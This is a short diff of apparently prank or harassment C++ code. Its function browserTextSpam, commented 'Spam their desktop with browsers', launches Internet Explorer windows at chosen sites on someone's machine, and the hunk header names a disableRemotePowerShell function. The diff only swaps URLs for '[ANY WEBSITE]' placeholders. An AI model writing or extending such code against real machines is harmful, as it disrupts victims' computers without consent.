@@ -57,11 +57,11 @@ void disableRemotePowerShell(){
 
 //Spam their desktop with browsers connecting to sites of your choice
 void browserTextSpam(){
-    string str = "start iexplore.exe http://";
-    string str2 = "start iexplore.exe http:/";
-    string str3 = "start iexplore.exe http://";
-    string str4 = "start iexplore.exe http://";
-    string str5 = "start iexplore.exe http://";
+    string str = "start iexplore.exe http://[ANY WEBSITE]";
+    string str2 = "start iexplore.exe http://[ANY WEBSITE]";
+    string str3 = "start iexplore.exe http://[ANY WEBSITE]";
+    string str4 = "start iexplore.exe http://[ANY WEBSITE]";
+    string str5 = "start iexplore.exe http://[ANY WEBSITE]";
     const char* A = str.c_str();
     const char* B = str2.c_str();
     const char* C = str3.c_str();
